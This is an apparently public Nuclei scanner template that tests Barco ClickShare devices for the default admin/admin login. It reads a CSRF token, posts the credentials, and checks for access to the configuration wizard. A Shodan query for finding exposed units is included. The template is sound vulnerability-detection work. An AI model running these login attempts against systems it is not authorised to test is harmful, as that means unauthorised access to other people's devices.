http:
- attack: pitchfork
  extractors:
  - group: 1
    internal: true
    name: token
    part: body
    regex:
    - ="csrf_protection_token" value="([0-9a-z]+)" \/>
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_2 == 303 || status_code_2 == 302
    - contains(body_3, "ClickShare Configuration Wizard")
    - contains(location_2, "/dashboard")
    type: dsl
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /login/log_me_in HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf_protection_token={{token}}&username={{username}}&password={{password}}&eula_accepted=true

    '
  - 'GET /configuration_wizard HTTP/1.1

    Host: {{Hostname}}

    '
id: barco-clickshare-default-login
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:o:barco:clickshare_cs-100_huddle_firmware:*:*:*:*:*:*:*:*
  description: 'Barco ClickShare contains a default login vulnerability. Default login
    password ''admin'' was found.

    '
  metadata:
    max-request: 3
    product: clickshare_cs-100_huddle_firmware
    shodan-query: ClickShareSession
    vendor: barco
  name: Barco ClickShare - Default Login
  severity: high
  tags: default-login,barco,clickshare,vuln
